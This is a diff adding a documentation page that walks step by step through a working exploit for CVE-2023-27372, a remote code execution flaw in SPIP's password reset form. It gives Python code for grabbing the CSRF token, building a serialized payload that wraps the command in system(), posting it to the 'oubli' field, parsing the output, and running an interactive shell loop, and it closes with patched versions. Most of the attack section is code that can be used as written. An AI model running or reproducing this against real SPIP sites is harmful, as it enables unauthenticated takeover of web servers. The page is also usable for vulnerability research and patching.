@@ -1,0 +1,149 @@
+---
+title: "How It Works"
+description: "Technical breakdown of the CVE-2023-27372 SPIP RCE exploit mechanism"
+---
+
+## Exploit Overview
+
+CVE-2023-27372 exploits a PHP object injection vulnerability in SPIP's password reset form. The vulnerability exists in the `oubli` parameter, which is improperly deserialized on the server-side. A crafted serialized payload containing PHP code is executed as the web user, and the output is reflected back in the HTTP response.
+
+<Note>
+This vulnerability affects SPIP versions before 4.2.1. It was fixed in versions 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
+</Note>
+
+## Exploitation Process
+
+<Steps>
+  <Step title="Fetch Anti-CSRF Token">
+    The exploit begins by requesting the password reset form at `/spip.php?page=spip_pass` and extracting the anti-CSRF token from the `formulaire_action_args` input field.
+
+    ```python
+    def get_csrf_token(url):
+        """Fetch the anti-CSRF token from the password reset form."""
+        try:
+            r = requests.get(f"{url}/spip.php?page=spip_pass", timeout=10)
+            soup = BeautifulSoup(r.text, "html.parser")
+            csrf_input = soup.find("input", {"name": "formulaire_action_args"})
+            if csrf_input:
+                return csrf_input["value"]
+            print("[-] Anti-CSRF token not found")
+        except Exception as e:
+            print(f"[-] Error fetching CSRF token: {e}")
+        return None
+    ```
+
+    This token is required to bypass SPIP's CSRF protection mechanism.
+  </Step>
+
+  <Step title="Construct PHP Serialized Payload">
+    A serialized PHP payload is constructed that injects arbitrary system commands. The payload format follows PHP's serialization syntax:
+
+    ```python
+    payload = f's:{20 + len(command)}:"<?php system(\'{command}\'); ?>";'
+    ```
+
+    **Payload structure breakdown:**
+    - `s:` - Indicates a serialized string type
+    - `{20 + len(command)}` - Length of the payload content (20 characters for PHP tags + command length)
+    - `"<?php system('COMMAND'); ?>"` - PHP code that executes the system command
+    - `;` - Serialization terminator
+
+    **Example:** For the command `id`, the payload becomes:
+    ```
+    s:22:"<?php system('id'); ?>";
+    ```
+  </Step>
+
+  <Step title="Inject Payload via POST Request">
+    The payload is sent as a POST request to the password reset endpoint with the following parameters:
+
+    ```python
+    r = requests.post(
+        f"{url}/spip.php?page=spip_pass",
+        data={
+            "page": "spip_pass",
+            "formulaire_action": "oubli",
+            "formulaire_action_args": csrf_token,
+            "oubli": payload,
+        },
+        timeout=10,
+    )
+    ```
+
+    **Key parameters:**
+    - `page`: Specifies the SPIP page handler
+    - `formulaire_action`: Set to "oubli" (forgot password action)
+    - `formulaire_action_args`: The CSRF token from Step 1
+    - `oubli`: The malicious serialized payload
+
+    When SPIP deserializes the `oubli` parameter, the PHP code is executed server-side.
+  </Step>
+
+  <Step title="Extract Command Output">
+    SPIP reflects the executed payload back in the response within the `oubli` input field's `value` attribute. The output appears in this format:
+
+    ```html
+    <input name="oubli" value="s:<n>:"<command_output>";" />
+    ```
+
+    A regex pattern extracts the command output from the raw response text:
+
+    ```python
+    match = re.search(r'value="s:\d+:"(.*?)";"\s', r.text, re.DOTALL)
+    if match:
+        return match.group(1).strip()
+    ```
+
+    **Regex breakdown:**
+    - `value="s:\d+:"` - Matches the serialized string prefix
+    - `(.*?)` - Captures the command output (non-greedy)
+    - `";"` - Matches the serialization terminator and closing quote
+    - `re.DOTALL` - Allows matching across multiple lines
+
+    <Note>
+    BeautifulSoup cannot parse this correctly due to the nested quotes, which is why regex extraction on raw text is necessary.
+    </Note>
+  </Step>
+</Steps>
+
+## Interactive Shell Implementation
+
+The exploit maintains an interactive shell by:
+
+1. **Initial validation**: Testing command execution with `id` to confirm vulnerability
+2. **CSRF token refresh**: Fetching a new token before each command (SPIP regenerates tokens)
+3. **Command loop**: Using `prompt_toolkit` for an enhanced CLI with history and auto-suggest
+
+```python
+while True:
+    command = session.prompt(
+        HTML("<ansired><b>Shell> </b></ansired>"),
+        auto_suggest=AutoSuggestFromHistory(),
+    )
+    # Refresh CSRF token each request — SPIP regenerates it
+    csrf_token = get_csrf_token(url)
+    if not csrf_token:
+        print("[-] Lost CSRF token, retrying...")
+        continue
+    print(run_command(url, csrf_token, command))
+```
+
+## Security Implications
+
+<Warning>
+This vulnerability allows unauthenticated attackers to:
+- Execute arbitrary system commands as the web server user
+- Read sensitive files and configuration
+- Establish reverse shells for persistent access
+- Pivot to internal networks
+</Warning>
+
+## Mitigation
+
+Upgrade SPIP to one of the patched versions:
+- **3.2.18** (for 3.2.x branch)
+- **4.0.10** (for 4.0.x branch)
+- **4.1.8** (for 4.1.x branch)
+- **4.2.1** (for 4.2.x branch)
+
+The fix addresses the unsafe deserialization of user-controlled input in the password reset functionality.
